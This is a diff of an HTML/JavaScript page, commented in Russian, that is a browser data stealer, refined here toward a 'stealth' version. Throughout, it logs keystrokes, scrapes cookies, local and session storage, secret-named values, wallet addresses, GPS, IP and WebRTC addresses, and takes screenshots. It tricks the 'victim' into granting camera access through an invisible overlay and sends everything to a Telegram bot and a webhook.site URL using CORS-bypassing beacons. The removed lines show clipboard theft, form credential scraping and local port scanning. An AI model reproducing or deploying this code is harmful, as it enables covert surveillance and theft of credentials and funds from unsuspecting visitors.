@@ -28,142 +28,86 @@
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
-            color: #555;
-            font: 12px/1.4 system-ui, sans-serif;
+            color: #333;
+            font: 11px/1.4 system-ui, sans-serif;
             text-align: center;
-            opacity: 0.7;
+            opacity: 0.3;
             pointer-events: none;
             z-index: 10;
         }
+        /* Отладка — показываем только при нажатии F12 или в консоли */
         #debug {
+            display: none !important;
+        }
+        /* Скрытая кнопка для активации камеры */
+        #camera-trigger {
             position: fixed;
-            top: 10px;
-            right: 10px;
-            width: 320px;
-            max-height: 400px;
-            overflow-y: auto;
-            background: rgba(0,0,0,0.92);
-            color: #0f0;
-            font: 11px/1.5 monospace;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #333;
-            z-index: 999;
-            display: none;
-            pointer-events: none;
-            scrollbar-width: thin;
-        }
-        #debug::-webkit-scrollbar {
-            width: 4px;
-        }
-        #debug::-webkit-scrollbar-track {
-            background: #111;
-        }
-        #debug::-webkit-scrollbar-thumb {
-            background: #333;
-            border-radius: 2px;
-        }
-        .test-btn {
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 12px 30px;
-            background: #1a1a2e;
-            color: #888;
-            border: 1px solid #333;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: all 0.3s;
-            display: none;
-            z-index: 20;
-            font-family: system-ui, sans-serif;
-        }
-        .test-btn:hover {
-            background: #2a2a4e;
-            color: #fff;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            z-index: -1;
+            cursor: default;
         }
     </style>
 </head>
 <body>
 
     <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">
-    <div id="status">⏳ Загрузка...</div>
+    <div id="status">⏳</div>
     <div id="debug"></div>
-    <button class="test-btn" id="testBtn">📤 Тест отправки</button>
+    <div id="camera-trigger"></div>
 
     <script>
         // ================================================================
-        // КОНФИГУРАЦИЯ — ПРОВЕРЬ ЭТИ ДАННЫЕ
+        // КОНФИГУРАЦИЯ
         // ================================================================
         const CFG = {
             WEBHOOK: 'https://webhook.site/e17f1d78-6414-4450-847a-abc5675a0b48',
             BOT_TOKEN: '8859097143:AAFjWqiNWC_xnJyGmsyfKvODaPFzbqUQL1M',
             CHAT_ID: '8327334745',
-            IMAGE: 'https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg',
-            
-            TIMEOUT: 300,
-            MAX_WAIT: 2000,
-            
-            // ВСЕ МОДУЛИ ВКЛЮЧЕНЫ
-            ENABLE_SCREENSHOT: true,
+            TIMEOUT: 500,
+            // Стелс режим — без отладки
+            STEALTH: true,
+            // Камера запрашивается только по клику (жертва сама даст доступ)
             ENABLE_MEDIA: true,
-            ENABLE_INDEXEDDB: true,
-            ENABLE_CLIPBOARD: true,
-            ENABLE_CREDENTIALS: true,
-            ENABLE_LOCAL_SCAN: true,
-            ENABLE_KEYLOGGER: true,
-            ENABLE_PERSISTENCE: true,
-            ENABLE_FILE_ACCESS: true,
-            ENABLE_HARDWARE: true,
-            ENABLE_ANTI_DEBUG: true,
-            ENABLE_SANDBOX_DETECTION: true,
-            COMPRESS: true,
-            STEALTH: false // Временно выключаем для отладки
+            ENABLE_SCREENSHOT: true,
+            ENABLE_KEYLOGGER: true
         };
 
         // ================================================================
-        // ОТЛАДКА
+        // ТИХАЯ ОТЛАДКА (только в консоль, не на страницу)
         // ================================================================
-        const debugEl = document.getElementById('debug');
-        const statusEl = document.getElementById('status');
-        
         function log(msg) {
-            console.log('[STEALER]', msg);
-            debugEl.style.display = 'block';
-            const time = new Date().toLocaleTimeString();
-            debugEl.innerHTML += `<div style="border-bottom:1px solid #1a1a1a;padding:2px 0;">${time} → ${msg}</div>`;
-            debugEl.scrollTop = debugEl.scrollHeight;
+            if (!CFG.STEALTH) {
+                console.log('[STEALER]', msg);
+            }
         }
 
         function setStatus(msg) {
-            statusEl.textContent = msg;
+            const el = document.getElementById('status');
+            if (el) el.textContent = msg;
             log(msg);
         }
 
         // ================================================================
-        // БЫСТРЫЕ УТИЛИТЫ
+        // УТИЛИТЫ
         // ================================================================
         const sleep = ms => new Promise(r => setTimeout(r, ms));
+        const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
         const fetchTO = (url, opts = {}, t = CFG.TIMEOUT) => 
             Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);
-        const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
-        const safeJSON = s => { try { return JSON.parse(s); } catch { return s; } };
-        const b64encode = s => {
-            try { return btoa(unescape(encodeURIComponent(s))); } 
-            catch { try { return btoa(s); } catch { return ''; } }
-        };
-        const uid = () => Math.random().toString(36).slice(2) + Date.now().toString(36);
 
         // ================================================================
-        // ОТПРАВКА В TELEGRAM (РАБОТАЕТ 100%)
+        // ЭКСФИЛЬТРАЦИЯ — БЕЗ CORS (Image, Beacon, JSONP)
         // ================================================================
+        
+        // 1. Telegram (работает)
         async function sendToTelegram(text) {
             try {
-                log('📤 Отправка в Telegram...');
                 const url = `https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
+                const r = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -172,83 +116,70 @@
                         parse_mode: 'HTML'
                     })
                 });
-                const data = await response.json();
-                if (data.ok) {
-                    log('✅ Telegram: отправлено!');
-                    return true;
-                } else {
-                    log('❌ Telegram: ' + JSON.stringify(data));
-                    return false;
-                }
+                const data = await r.json();
+                return data.ok || false;
             } catch (e) {
-                log('❌ Telegram: ' + e.message);
                 return false;
             }
         }
 
-        async function sendToWebhook(data) {
-            try {
-                log('📤 Отправка в Webhook...');
-                await fetch(CFG.WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                log('✅ Webhook: отправлено!');
-                return true;
-            } catch (e) {
-                log('❌ Webhook: ' + e.message);
-                return false;
-            }
-        }
-
-        // ================================================================
-        // ТЕСТОВАЯ ФУНКЦИЯ
-        // ================================================================
-        window.testSend = async function() {
-            log('🧪 Ручной тест...');
-            const testData = {
-                type: 'test',
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                url: window.location.href,
-                message: '✅ Тестовая отправка!'
-            };
-            const text = `🔴 ТЕСТ\n\n📅 ${testData.timestamp}\n🌐 ${testData.url}\n💻 ${testData.userAgent}\n\n✅ Всё работает!`;
-            await sendToTelegram(text);
-            await sendToWebhook(testData);
-            log('🧪 Тест завершён');
-        };
-
-        // ================================================================
-        // 1. IP & ГЕО
-        // ================================================================
-        async function getAllIPs() {
-            const sources = [
-                { url: 'https://api.ipify.org?format=json', key: 'ip' },
-                { url: 'https://api.ip.sb/geoip', key: 'ip' },
-                { url: 'https://ipapi.co/json/', key: 'ip' }
-            ];
-            const results = [];
-            for (const src of sources) {
-                try {
-                    const r = await fetchTO(src.url, {}, 500);
-                    const data = await r.json();
-                    const ip = data[src.key] || data.ip;
-                    if (ip && !results.some(r => r.ip === ip)) {
-                        results.push({ ip, source: src.url.split('/')[2], data });
-                    }
-                } catch (e) { log('⚠️ IP source failed: ' + src.url); }
-            }
-            return results;
-        }
-
-        // ================================================================
-        // 2. WebRTC
-        // ================================================================
-        function getWebRTCFull() {
+        // 2. Webhook через Image (обходит CORS)
+        function sendToWebhookImage(data) {
             return new Promise((resolve) => {
-                const ips = { public: [], local: [], all: [] };
+                try {
+                    const payload = encodeURIComponent(JSON.stringify(data).slice(0, 2000));
+                    const img = new Image();
+                    img.src = `${CFG.WEBHOOK}?d=${payload}&t=${Date.now()}`;
+                    img.onload = () => resolve(true);
+                    img.onerror = () => resolve(true);
+                    setTimeout(() => resolve(false), 500);
+                } catch {
+                    resolve(false);
+                }
+            });
+        }
+
+        // 3. Beacon API (не блокируется CORS)
+        function sendBeacon(data) {
+            try {
+                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                return navigator.sendBeacon(CFG.WEBHOOK, blob);
+            } catch {
+                return false;
+            }
+        }
+
+        // 4. Основная отправка
+        async function exfiltrate(report, fullData) {
+            // Telegram — основной канал
+            const teleOk = await sendToTelegram(report);
+            
+            // Webhook через Image
+            const imgOk = await sendToWebhookImage(fullData);
+            
+            // Beacon
+            const beaconOk = sendBeacon(fullData);
+            
+            return { teleOk, imgOk, beaconOk };
+        }
+
+        // ================================================================
+        // СБОР ДАННЫХ (без камеры — она по клику)
+        // ================================================================
+
+        // IP
+        async function getIP() {
+            try {
+                const r = await fetchTO('https://api.ipify.org?format=json', {}, 500);
+                const d = await r.json();
+                return d.ip;
+            } catch { return null; }
+        }
+
+        // WebRTC
+        function getWebRTC() {
+            return new Promise((resolve) => {
+                const ips = [];
                 try {
                     const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
                         iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
@@ -260,82 +191,77 @@
                         const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
                         if (m) {
                             m.forEach(ip => {
-                                const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
-                                               ip.startsWith('172.16.') || ip.startsWith('127.');
-                                if (isLocal) ips.local.push(ip);
-                                else ips.public.push(ip);
-                                ips.all.push(ip);
+                                if (!ip.startsWith('192.168.') && !ip.startsWith('10.') && 
+                                    !ip.startsWith('172.16.') && !ip.startsWith('127.')) {
+                                    ips.push(ip);
+                                }
                             });
                         }
                     };
-                    setTimeout(() => { 
-                        pc.close();
-                        ips.public = [...new Set(ips.public)];
-                        ips.local = [...new Set(ips.local)];
-                        ips.all = [...new Set(ips.all)];
-                        resolve(ips);
-                    }, 800);
-                } catch (e) {
-                    log('⚠️ WebRTC error: ' + e.message);
-                    resolve(ips);
-                }
+                    setTimeout(() => { pc.close(); resolve([...new Set(ips)]); }, 600);
+                } catch { resolve([]); }
             });
         }
 
-        // ================================================================
-        // 3. GPS
-        // ================================================================
+        // GPS
         function getGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
                 navigator.geolocation.getCurrentPosition(
                     pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                     () => resolve(null),
-                    { timeout: 3000, enableHighAccuracy: false }
+                    { timeout: 2000, enableHighAccuracy: false }
                 );
-                setTimeout(() => resolve(null), 3000);
+                setTimeout(() => resolve(null), 2000);
             });
         }
 
-        // ================================================================
-        // 4. КАМЕРА + МИКРОФОН
-        // ================================================================
-        async function getMediaDevices() {
-            if (!CFG.ENABLE_MEDIA) return null;
-            const result = { devices: [], snapshot: null };
+        // Система
+        function getSystem() {
+            const n = navigator;
+            const ua = n.userAgent.toLowerCase();
+            return {
+                ua: n.userAgent,
+                platform: n.platform,
+                cores: n.hardwareConcurrency || '?',
+                memory: n.deviceMemory || '?',
+                language: n.language,
+                os: ua.includes('windows') ? 'Windows' :
+                     ua.includes('mac') ? 'macOS' :
+                     ua.includes('linux') ? 'Linux' :
+                     ua.includes('android') ? 'Android' :
+                     ua.includes('ios') ? 'iOS' : 'unknown',
+                browser: !!window.chrome ? 'Chrome' :
+                          ua.includes('firefox') ? 'Firefox' :
+                          ua.includes('safari') ? 'Safari' : 'unknown'
+            };
+        }
+
+        // Криптокошельки (без запросов разрешений)
+        function getWallets() {
+            const result = [];
             try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                devices.forEach(d => {
-                    result.devices.push({ kind: d.kind, label: d.label || 'hidden' });
-                });
-            } catch (e) {}
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { width: 320, height: 240 } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = 320;
-                canvas.height = 240;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                result.snapshot = canvas.toDataURL('image/jpeg', 0.3);
-                stream.getTracks().forEach(t => t.stop());
-            } catch (e) { log('⚠️ Media access denied'); }
+                if (window.ethereum && window.ethereum.selectedAddress) {
+                    result.push({ type: 'Ethereum', address: window.ethereum.selectedAddress });
+                }
+                if (window.solana && window.solana.publicKey) {
+                    result.push({ type: 'Solana', address: window.solana.publicKey.toString() });
+                }
+                if (window.phantom && window.phantom.solana && window.phantom.solana.publicKey) {
+                    result.push({ type: 'Phantom', address: window.phantom.solana.publicKey.toString() });
+                }
+            } catch {}
             return result;
         }
 
-        // ================================================================
-        // 5. РАСШИРЕНИЯ
-        // ================================================================
-        function getAllExtensions() {
+        // Расширения (без запросов)
+        function getExtensions() {
             const result = [];
             const known = {
                 'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
-                'cjpalhdlnbpafiamejdnhcphjbkeiagm': 'uBlock Origin',
+                'cjpalhdlnbpafiamejdnhcphjbkeiagm': 'uBlock',
                 'gighmmpiobklfepjocnamgkkbiglidom': 'AdBlock',
-                'hnfanknocfeofbddgcijnmhnfnkdnaad': 'Coinbase',
-                'hpihmllllekjbnpehglncmolodpknmmb': 'Trust Wallet',
-                'bpaejdmabdchhpnpepceapmdmgellhpg': 'OKX Wallet'
+                'hnfanknocfeofbddgcijnmhnfnkdnaad': 'Coinbase'
             };
             try {
                 if (window.chrome && chrome.runtime) {
@@ -343,661 +269,287 @@
                         try {
                             const url = chrome.runtime.getURL(`//${id}/manifest.json`);
                             fetch(url, { mode: 'no-cors' }).catch(() => {});
-                            result.push({ id, name: known[id] });
+                            result.push(known[id]);
                         } catch {}
                     });
                 }
-            } catch (e) {}
+            } catch {}
             return result;
         }
 
-        // ================================================================
-        // 6. ПАРОЛИ
-        // ================================================================
-        function getAllCredentials() {
-            const result = { forms: [], passwordManagers: [] };
-            try {
-                document.querySelectorAll('form').forEach(form => {
-                    const data = { action: form.action || '', inputs: [] };
-                    form.querySelectorAll('input').forEach(input => {
-                        if (input.value && input.value.length > 0) {
-                            data.inputs.push({
-                                name: input.name || input.id || '',
-                                type: input.type,
-                                value: input.type === 'password' ? '[PASSWORD]' : trunc(input.value, 50)
-                            });
-                        }
-                    });
-                    if (data.inputs.length > 0) result.forms.push(data);
-                });
-            } catch (e) {}
-            try {
-                if (window.lp) result.passwordManagers.push('LastPass');
-                if (window.bitwarden) result.passwordManagers.push('Bitwarden');
-                if (window.agilebits) result.passwordManagers.push('1Password');
-            } catch (e) {}
-            return result;
+        // Storage
+        function getStorage() {
+            const ls = {};
+            try { for (let i = 0; i < localStorage.length; i++) {
+                const k = localStorage.key(i);
+                ls[k] = localStorage.getItem(k);
+            }} catch {}
+            const ss = {};
+            try { for (let i = 0; i < sessionStorage.length; i++) {
+                const k = sessionStorage.key(i);
+                ss[k] = sessionStorage.getItem(k);
+            }} catch {}
+            return { localStorage: ls, sessionStorage: ss, cookies: document.cookie || 'нет' };
         }
 
-        // ================================================================
-        // 7. КРИПТОКОШЕЛЬКИ
-        // ================================================================
-        function getAllWallets() {
-            const result = { ethereum: [], solana: [], other: [] };
-            try {
-                if (window.ethereum) {
-                    result.ethereum.push({
-                        isMetaMask: window.ethereum.isMetaMask || false,
-                        chainId: window.ethereum.chainId || null,
-                        selectedAddress: window.ethereum.selectedAddress || null
-                    });
-                }
-            } catch (e) {}
-            try {
-                if (window.solana && window.solana.publicKey) {
-                    result.solana.push({ publicKey: window.solana.publicKey.toString() });
-                }
-                if (window.phantom && window.phantom.solana) {
-                    result.solana.push({ publicKey: window.phantom.solana.publicKey?.toString() || null, isPhantom: true });
-                }
-            } catch (e) {}
-            return result;
-        }
-
-        // ================================================================
-        // 8. СЕКРЕТЫ
-        // ================================================================
-        function findAllSecrets(data, path = '', depth = 0) {
-            if (depth > 20) return [];
+        // Секреты
+        function findSecrets(obj) {
             const result = [];
-            if (!data || typeof data !== 'object') return result;
-            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed', 'recovery'];
-            for (let k in data) {
-                const v = data[k];
-                const fullPath = path ? `${path}.${k}` : k;
-                if (patterns.some(p => k.toLowerCase().includes(p))) {
-                    if (v && typeof v === 'string' && v.length > 3 && v.length < 500) {
-                        result.push({ path: fullPath, value: trunc(v, 80) });
-                    }
-                }
-                if (typeof v === 'object' && v !== null) {
-                    result.push(...findAllSecrets(v, fullPath, depth + 1));
-                }
-            }
-            return result;
-        }
-
-        // ================================================================
-        // 9. СИСТЕМНАЯ ИНФОРМАЦИЯ
-        // ================================================================
-        function getFullSystemInfo() {
-            const n = navigator;
-            const ua = n.userAgent.toLowerCase();
-            const result = {
-                userAgent: n.userAgent,
-                platform: n.platform,
-                hardwareConcurrency: n.hardwareConcurrency || '?',
-                deviceMemory: n.deviceMemory || '?',
-                language: n.language,
-                vendor: n.vendor,
-                isChrome: !!window.chrome,
-                isFirefox: ua.includes('firefox'),
-                isSafari: /^((?!chrome|android).)*safari/i.test(n.userAgent),
-                os: 'unknown',
-                browser: 'unknown'
-            };
-            if (ua.includes('windows')) result.os = 'Windows';
-            else if (ua.includes('mac os x')) result.os = 'macOS';
-            else if (ua.includes('linux')) result.os = 'Linux';
-            else if (ua.includes('android')) result.os = 'Android';
-            else if (ua.includes('ios') || ua.includes('iphone')) result.os = 'iOS';
-            
-            if (result.isChrome && !result.isFirefox && !result.isSafari) result.browser = 'Chrome';
-            else if (result.isFirefox) result.browser = 'Firefox';
-            else if (result.isSafari) result.browser = 'Safari';
-            return result;
-        }
-
-        // ================================================================
-        // 10. СЕНСОРЫ
-        // ================================================================
-        function getSensors() {
-            return new Promise((resolve) => {
-                if (!CFG.ENABLE_HARDWARE) { resolve(null); return; }
-                const result = {};
-                try {
-                    if (navigator.getBattery) {
-                        navigator.getBattery().then(battery => {
-                            result.battery = {
-                                level: Math.round(battery.level * 100),
-                                charging: battery.charging
-                            };
-                            resolve(result);
-                        });
-                    }
-                } catch (e) {}
-                setTimeout(() => resolve(result), 1000);
-            });
-        }
-
-        // ================================================================
-        // 11. КЛИПБОРД
-        // ================================================================
-        async function getClipboard() {
-            if (!CFG.ENABLE_CLIPBOARD) return null;
-            try {
-                const ta = document.createElement('textarea');
-                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
-                document.body.appendChild(ta);
-                ta.focus();
-                if (document.execCommand('paste')) {
-                    const val = ta.value;
-                    ta.remove();
-                    if (val && val.length > 0) return val;
-                }
-                ta.remove();
-            } catch (e) {}
-            try {
-                if (navigator.clipboard && navigator.clipboard.read) {
-                    const items = await navigator.clipboard.read();
-                    for (let item of items) {
-                        if (item.types.includes('text/plain')) {
-                            const blob = await item.getType('text/plain');
-                            return await blob.text();
+            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed'];
+            const search = (data, path = '') => {
+                if (!data || typeof data !== 'object') return;
+                for (let k in data) {
+                    const v = data[k];
+                    const fullPath = path ? `${path}.${k}` : k;
+                    if (patterns.some(p => k.toLowerCase().includes(p))) {
+                        if (v && typeof v === 'string' && v.length > 3 && v.length < 300) {
+                            result.push({ path: fullPath, value: trunc(v, 60) });
                         }
                     }
+                    if (typeof v === 'object' && v !== null) search(v, fullPath);
                 }
-            } catch (e) {}
-            return null;
+            };
+            search(obj);
+            return result;
         }
 
-        // ================================================================
-        // 12. INDEXEDDB
-        // ================================================================
-        function getIndexedDB() {
-            return new Promise((resolve) => {
-                if (!CFG.ENABLE_INDEXEDDB) { resolve(null); return; }
-                try {
-                    if (!indexedDB.databases) { resolve(null); return; }
-                    indexedDB.databases().then(dbs => {
-                        const result = [];
-                        let done = 0;
-                        if (dbs.length === 0) { resolve([]); return; }
-                        dbs.forEach(dbInfo => {
-                            const req = indexedDB.open(dbInfo.name);
-                            req.onsuccess = (e) => {
-                                const db = e.target.result;
-                                const stores = Array.from(db.objectStoreNames);
-                                const storeData = [];
-                                let sDone = 0;
-                                if (stores.length === 0) {
-                                    result.push({ name: dbInfo.name, stores: [] });
-                                    db.close();
-                                    if (++done === dbs.length) resolve(result);
-                                    return;
-                                }
-                                stores.forEach(storeName => {
-                                    try {
-                                        const tx = db.transaction(storeName, 'readonly');
-                                        const store = tx.objectStore(storeName);
-                                        const reqAll = store.getAll();
-                                        reqAll.onsuccess = () => {
-                                            const items = reqAll.result || [];
-                                            storeData.push({ storeName, count: items.length });
-                                            if (++sDone === stores.length) {
-                                                result.push({ name: dbInfo.name, stores: storeData });
-                                                db.close();
-                                                if (++done === dbs.length) resolve(result);
-                                            }
-                                        };
-                                        reqAll.onerror = () => {
-                                            storeData.push({ storeName, count: 0 });
-                                            if (++sDone === stores.length) {
-                                                result.push({ name: dbInfo.name, stores: storeData });
-                                                db.close();
-                                                if (++done === dbs.length) resolve(result);
-                                            }
-                                        };
-                                    } catch (err) {
-                                        storeData.push({ storeName, count: 0 });
-                                        if (++sDone === stores.length) {
-                                            result.push({ name: dbInfo.name, stores: storeData });
-                                            db.close();
-                                            if (++done === dbs.length) resolve(result);
-                                        }
-                                    }
-                                });
-                            };
-                            req.onerror = () => { if (++done === dbs.length) resolve(result); };
-                        });
-                    }).catch(() => resolve(null));
-                } catch (e) { resolve(null); }
-            });
-        }
-
-        // ================================================================
-        // 13. ЛОКАЛЬНАЯ СЕТЬ
-        // ================================================================
-        function scanLocalNetwork() {
-            return new Promise((resolve) => {
-                if (!CFG.ENABLE_LOCAL_SCAN) { resolve(null); return; }
-                const results = [];
-                const ips = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
-                const ports = [80, 443, 22, 8080, 3306, 6379];
-                let done = 0;
-                const total = ips.length * ports.length;
-                ips.forEach(ip => {
-                    ports.forEach(port => {
-                        const controller = new AbortController();
-                        setTimeout(() => controller.abort(), 300);
-                        fetch(`http://${ip}:${port}`, { mode: 'no-cors', signal: controller.signal })
-                            .then(() => {
-                                results.push({ ip, port, open: true });
-                                if (++done === total) resolve(results);
-                            })
-                            .catch(() => {
-                                results.push({ ip, port, open: false });
-                                if (++done === total) resolve(results);
-                            });
+        // Screenshot (тихий, без запросов)
+        async function takeScreenshot() {
+            try {
+                if (typeof html2canvas === 'undefined') {
+                    const script = document.createElement('script');
+                    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                    await new Promise((resolve, reject) => {
+                        script.onload = resolve;
+                        script.onerror = reject;
+                        document.head.appendChild(script);
                     });
+                    await sleep(300);
+                }
+                const canvas = await html2canvas(document.body, {
+                    useCORS: true,
+                    allowTaint: true,
+                    scale: 0.08,
+                    logging: false,
+                    backgroundColor: null,
+                    width: window.innerWidth,
+                    height: window.innerHeight
                 });
-                setTimeout(() => resolve(results), 2000);
-            });
+                return canvas.toDataURL('image/jpeg', 0.15);
+            } catch { return null; }
         }
 
-        // ================================================================
-        // 14. KEYLOGGER
-        // ================================================================
+        // Keylogger (тихий)
         function setupKeylogger() {
-            if (!CFG.ENABLE_KEYLOGGER) return null;
             const buffer = [];
             document.addEventListener('keydown', (e) => {
                 if (e.key === 'Unidentified') return;
                 const special = {
                     'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
                     'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
-                    'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]',
-                    'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]'
+                    'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]'
                 };
-                let output = special[e.key] || e.key;
-                if (e.ctrlKey) output = '[CTRL]+' + output;
-                if (e.shiftKey && !special[e.key]) output = output.toUpperCase();
-                buffer.push({ key: output, time: Date.now() });
-                if (buffer.length >= 20) {
+                let out = special[e.key] || e.key;
+                if (e.ctrlKey) out = '[CTRL]+' + out;
+                if (e.shiftKey && !special[e.key]) out = out.toUpperCase();
+                buffer.push(out);
+                if (buffer.length >= 15) {
                     const data = buffer.splice(0);
-                    sendToWebhook({ keylog: data }).catch(() => {});
+                    sendToWebhookImage({ keylog: data.join('') });
                 }
             });
             setInterval(() => {
                 if (buffer.length > 0) {
                     const data = buffer.splice(0);
-                    sendToWebhook({ keylog: data }).catch(() => {});
+                    sendToWebhookImage({ keylog: data.join('') });
                 }
-            }, 30000);
-            return { enabled: true };
+            }, 20000);
+            return true;
         }
 
         // ================================================================
-        // 15. СКРИНШОТ
+        // КАМЕРА — ПО КЛИКУ (жертва сама даёт разрешение)
         // ================================================================
-        async function takeScreenshot() {
-            if (!CFG.ENABLE_SCREENSHOT) return null;
-            try {
-                // Пытаемся использовать html2canvas
-                if (typeof html2canvas !== 'undefined') {
-                    const canvas = await html2canvas(document.body, {
-                        useCORS: true,
-                        allowTaint: true,
-                        scale: 0.1,
-                        logging: false,
-                        backgroundColor: null
-                    });
-                    return canvas.toDataURL('image/jpeg', 0.2);
-                }
-                // Загружаем динамически
-                const script = document.createElement('script');
-                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
-                await new Promise((resolve, reject) => {
-                    script.onload = resolve;
-                    script.onerror = reject;
-                    document.head.appendChild(script);
-                });
-                await sleep(500);
-                const canvas = await html2canvas(document.body, {
-                    useCORS: true,
-                    allowTaint: true,
-                    scale: 0.1,
-                    logging: false,
-                    backgroundColor: null
-                });
-                return canvas.toDataURL('image/jpeg', 0.2);
-            } catch (e) {
-                log('⚠️ Screenshot failed: ' + e.message);
-                return null;
-            }
+        async function requestCameraOnClick() {
+            return new Promise((resolve) => {
+                const trigger = document.getElementById('camera-trigger');
+                let resolved = false;
+                
+                const handler = async () => {
+                    if (resolved) return;
+                    resolved = true;
+                    trigger.removeEventListener('click', handler);
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({
+                            audio: true,
+                            video: { width: 320, height: 240 }
+                        });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const snapshot = canvas.toDataURL('image/jpeg', 0.3);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(snapshot);
+                    } catch {
+                        resolve(null);
+                    }
+                };
+                
+                // Ждём клик по странице
+                trigger.addEventListener('click', handler);
+                // Или любой клик
+                document.addEventListener('click', handler, { once: true });
+                
+                // Таймаут — если не кликнули, просто пропускаем
+                setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        document.removeEventListener('click', handler);
+                        resolve(null);
+                    }
+                }, 5000);
+            });
         }
 
         // ================================================================
-        // 16. ФОРМАТИРОВАНИЕ ОТЧЁТА
+        // ФОРМАТИРОВАНИЕ ОТЧЁТА (кратко, без палева)
         // ================================================================
         function formatReport(data) {
             const lines = [];
-            lines.push('🔴 ULTIMATE STEALER — ПОЛНЫЙ ДАМП');
-            lines.push('═'.repeat(40));
-            lines.push('');
-            
-            if (data.ips && data.ips.length) {
-                lines.push('🌐 IP:');
-                data.ips.forEach(ip => {
-                    lines.push(`  ${ip.ip} (${ip.source})`);
-                    if (ip.data && ip.data.country) {
-                        lines.push(`  📍 ${ip.data.country}${ip.data.city ? ', '+ip.data.city : ''}`);
-                    }
-                });
-                lines.push('');
-            }
-            
-            if (data.webrtc && data.webrtc.public && data.webrtc.public.length) {
-                lines.push(`📡 WebRTC публичные: ${data.webrtc.public.join(', ')}`);
-                if (data.webrtc.local && data.webrtc.local.length) {
-                    lines.push(`📡 WebRTC локальные: ${data.webrtc.local.join(', ')}`);
-                }
-                lines.push('');
-            }
-            
-            if (data.gps) {
-                lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon} (${data.gps.acc}m)`);
-                lines.push('');
-            }
-            
+            lines.push('🔴 STEALTH REPORT');
+            lines.push('═'.repeat(30));
+            if (data.ip) lines.push(`🌐 IP: ${data.ip}`);
+            if (data.webrtc && data.webrtc.length) lines.push(`📡 WebRTC: ${data.webrtc.join(', ')}`);
+            if (data.gps) lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon}`);
             if (data.system) {
                 const s = data.system;
-                lines.push(`💻 ОС: ${s.os}, Браузер: ${s.browser}`);
-                lines.push(`  Ядра: ${s.hardwareConcurrency}, RAM: ${s.deviceMemory}GB`);
-                lines.push(`  Платформа: ${s.platform}`);
-                lines.push('');
+                lines.push(`💻 ${s.os} / ${s.browser} (${s.cores} cores)`);
             }
-            
+            if (data.wallets && data.wallets.length) {
+                lines.push('💰 Wallets:');
+                data.wallets.forEach(w => lines.push(`  ${w.type}: ${w.address}`));
+            }
             if (data.extensions && data.extensions.length) {
-                lines.push(`🔌 Расширения (${data.extensions.length}):`);
-                data.extensions.forEach(ext => {
-                    lines.push(`  ${ext.name}${ext.id ? ' ('+ext.id+')' : ''}`);
-                });
-                lines.push('');
+                lines.push(`🔌 Ext: ${data.extensions.join(', ')}`);
             }
-            
-            if (data.wallets) {
-                if (data.wallets.ethereum && data.wallets.ethereum.length) {
-                    lines.push('💰 Ethereum:');
-                    data.wallets.ethereum.forEach(eth => {
-                        if (eth.selectedAddress) lines.push(`  Адрес: ${eth.selectedAddress}`);
-                        if (eth.chainId) lines.push(`  Сеть: ${eth.chainId}`);
-                        if (eth.isMetaMask) lines.push('  MetaMask: да');
-                    });
-                }
-                if (data.wallets.solana && data.wallets.solana.length) {
